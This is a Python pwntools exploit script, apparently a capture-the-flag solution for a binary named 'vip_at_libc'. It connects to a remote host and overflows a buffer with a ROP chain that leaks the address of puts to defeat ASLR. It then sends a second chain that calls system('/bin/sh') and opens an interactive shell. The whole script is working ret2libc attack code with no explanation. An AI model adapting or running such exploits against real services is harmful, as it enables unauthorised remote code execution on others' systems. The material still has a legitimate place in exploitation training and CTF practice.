#!/usr/bin/env python3
from pwn import *
import warnings
warnings.simplefilter("ignore")
#https://smallkirby.hatenablog.com/?page=1566618148

#target = process("./vip_at_libc")
target = remote("51.254.39.184", 1335)
elf = ELF("vip_at_libc")
libc = ELF("libc.so.6")
#gdb.attach(target, gdbscript="b * 0x401203")

def username(name):
    target.recvuntil("\n")
    target.sendline(name)

def go_vip():
    target.recvuntil("> ")
    target.sendline(b"2")
    target.recvuntil("> ")
    target.sendline(b"1")
    target.recvuntil("> ")
    target.sendline(b"111111111111111")
    target.recvuntil("> ")
    target.sendline(b"3")
    target.recvuntil("> ")
    target.sendline(b"1")
    print(target.recvuntil("owner."))


username(b"hello")
go_vip()

target.recvuntil("> ")
target.sendline(b"4")
target.recvuntil("> ")
payload = b"1" * 0x18 + p64(0x401186) + p64(elf.got["puts"]) + p64(elf.symbols["puts"]) + p64(0x40166c)
target.sendline(payload)

for i in range(5):
    target.recvline()

leak = u64(target.recv(6) + b"\x00" * 2) - libc.symbols["puts"]
print(hex((leak)))

print(target.recvline())
target.sendline("")

go_vip()
print(target.recvline())
print(target.recvuntil("> "))
target.sendline("4")
print(target.recvline())

system = leak + libc.symbols["system"]
binsh = leak + 0x1d8698
payload1 = p64(0x0) * 3 + p64(0x40101a) + p64(0x401186) + p64(binsh) + p64(system)
target.recvuntil("> ")
target.sendline(payload1)

target.interactive()